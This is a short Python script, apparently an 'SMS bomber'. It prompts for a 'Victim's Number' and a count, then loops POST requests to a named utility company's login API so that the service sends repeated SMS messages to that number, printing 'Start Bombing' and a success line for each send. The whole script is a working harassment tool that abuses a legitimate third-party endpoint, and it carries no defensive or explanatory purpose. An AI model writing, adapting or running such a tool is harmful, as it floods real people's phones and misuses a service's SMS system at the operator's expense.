import requests
from requests.structures import CaseInsensitiveDict

print("\033[96m")      #LightCyan

print("[!]  Welcome RH!  [!]\n")

print("\033[0m")       #color_off

print("\033[93m")     #LightYellow 


number=str(input("[>]Enter Victim\'s Number : "))
amount=int(input("\n[>]Enter The Amount : ")) 

print("\033[0m")      #color_off
 
url1 = "http://nesco.sslwireless.com:80/api/v1/login"

headers1 = CaseInsensitiveDict()
headers1["Content-Type"] = "application/x-www-form-urlencoded"

data1 = "phone_number=\n"+number 
print("\033[92m")           #LightGreen 
print("Start Bombing. . . \n\n") 

for i in range (amount): 
    resp1 = requests.post(url1, headers=headers1, data=data1)
    
    print("\033[92m")           #LightGreen 
    
    
    print(str(i+1)+" ✓Sms Sent Successfully From Error Alpha")